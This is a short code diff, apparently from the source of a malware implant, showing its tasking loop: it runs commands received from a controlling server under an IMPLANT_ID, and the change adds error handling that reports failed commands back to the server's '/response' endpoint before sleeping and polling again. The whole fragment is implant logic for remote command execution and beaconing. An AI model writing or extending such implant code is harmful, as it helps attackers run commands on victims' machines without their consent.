@@ -73,8 +73,14 @@ void IWillRunForever(void){
             /* Only execute commands that are untouched */
             std::string command = converted_new_item.at(i).at(2);
             std::string args = converted_new_item.at(i).at(3);
-            execute(command, args, converted_new_item.at(i).at(0), IMPLANT_ID);
+            try{
+                execute(command, args, converted_new_item.at(i).at(0), IMPLANT_ID);
+            }
+            catch(...){
+                HttpResponse("/response", IMPLANT_ID, converted_new_item.at(i).at(0), "it failed", "Failure", command);
+            }
         }
+            
             
         Sleep(60000);
     }
